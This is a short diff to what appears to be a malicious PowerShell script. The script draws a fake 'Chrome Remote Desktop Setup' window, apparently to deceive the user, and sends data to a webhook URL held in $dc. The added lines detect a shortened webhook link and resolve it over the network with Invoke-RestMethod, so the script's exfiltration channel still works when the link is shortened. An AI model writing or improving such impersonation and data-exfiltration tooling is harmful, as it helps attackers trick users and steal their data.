@@ -15,6 +15,9 @@ $memoryStream = New-Object IO.MemoryStream($imageBytes, 0, $imageBytes.Length)
 $memoryStream.Write($imageBytes, 0, $imageBytes.Length);
 $image = [System.Drawing.Image]::FromStream($memoryStream)
 
+# shortened URL Detection
+if ($dc.Ln -ne 121){Write-Host "Shortened Webhook URL Detected.." ; $dc = (irm $dc).url}
+
 $setupwindow = New-Object System.Windows.Forms.Form
 $setupwindow.ClientSize = '600,450'
 $setupwindow.Text = "Chrome Remote Desktop Setup"
